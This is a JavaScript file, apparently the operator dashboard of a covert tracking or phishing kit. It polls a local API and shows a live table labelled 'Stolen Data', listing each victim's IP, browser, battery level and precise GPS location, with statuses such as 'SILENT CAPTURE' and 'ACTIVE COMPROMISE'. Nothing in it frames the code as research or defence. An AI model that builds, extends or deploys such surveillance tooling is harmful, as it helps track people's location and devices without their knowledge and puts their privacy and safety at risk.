document.addEventListener('DOMContentLoaded', () => {
    
    // Admin Dashboard Initialization
    // We only poll for data here now.
    // 2. Poll for Stolen Data
    const tableBody = document.getElementById('tableBody');
    const totalCount = document.getElementById('totalCount');
    let knownDataLength = 0; // Keep track so we can animate *new* rows

    function fetchStolenData() {
        fetch('/api/data')
            .then(response => response.json())
            .then(data => {
                if (!data) return;
                
                // Update header count
                totalCount.textContent = data.length;

                // If no changes, do nothing.
                if (data.length === knownDataLength) return;

                // If we went from 0 to 1+, clear the empty state
                if (knownDataLength === 0 && data.length > 0) {
                    tableBody.innerHTML = ''; 
                }

                // Render *only* the new items by iterating from known length to new length.
                // We prepend to table body so newest is at top.
                for (let i = knownDataLength; i < data.length; i++) {
                    const entry = data[i];
                    const meta = entry.metadata || {};
                    
                    // Format Time safely
                    let timeStr = 'Unknown';
                    if (entry.timestamp) {
                        try {
                            const d = new Date(entry.timestamp);
                            timeStr = d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
                        } catch (e) {
                            timeStr = entry.timestamp;
                        }
                    }

                    // Extract a shorter User Agent string (just browser/os rough guess)
                    let browserStr = meta.userAgent || 'Unknown';
                    // Very simple heuristic to shorten UA string for table display
                    if (browserStr.includes('Chrome')) browserStr = 'Chrome ' + (browserStr.includes('Mobile') ? '(Mobile)' : '(Desktop)');
                    else if (browserStr.includes('Safari') && !browserStr.includes('Chrome')) browserStr = 'Safari ' + (browserStr.includes('Mobile') ? '(Mobile)' : '(Desktop)');
                    else if (browserStr.includes('Firefox')) browserStr = 'Firefox';
                    else if (browserStr.includes('Edge')) browserStr = 'Edge';

                    // Parse Platform
                    let platStr = meta.platform || 'Unknown';
                    
                    const statusHtml = entry.status === 'SILENT_CAPTURE' 
                        ? '<span style="color: #f59e0b; background: rgba(245, 158, 11, 0.1); padding: 4px 8px; border-radius: 4px; font-size: 0.75rem;">SILENT</span>'
                        : '<span style="color: #ef4444; background: rgba(239, 68, 68, 0.1); padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: bold;">ACTIVE COMPROMISE</span>';

                    let locStr = '<span style="color: #64748b; font-size: 0.85rem;">IP Only</span>';
                    if (entry.location) {
                        locStr = `<a href="https://www.google.com/maps?q=${entry.location.lat},${entry.location.lon}" target="_blank" style="color: #38bdf8; text-decoration: none; font-size: 0.9rem;" title="Accuracy: ${Math.round(entry.location.accuracy)}m"><i class="fa-solid fa-location-dot"></i> Precise GPS</a>`;
                    }

                    const row = document.createElement('tr');
                    row.className = 'new-entry'; // Triggers CSS animation highlight
                    row.innerHTML = `
                        <td title="${entry.timestamp}">${timeStr}</td>
                        <td style="color: #cbd5e1; font-weight: bold;">${entry.ip}</td>
                        <td>${statusHtml}</td>
                        <td title="${meta.userAgent || ''}">${browserStr}</td>
                        <td style="color: #a3e635;">${meta.battery || 'Unknown'}</td>
                        <td>${locStr}</td>
                    `;
                    
                    // Prepend to top
                    tableBody.insertBefore(row, tableBody.firstChild);
                }

                // Update our tracker
                knownDataLength = data.length;
            })
            .catch(error => {
                console.error("Error fetching data:", error);
            });
    }

    // Poll every 2 seconds
    setInterval(fetchStolenData, 2000);
    // Initial fetch
    fetchStolenData();
});
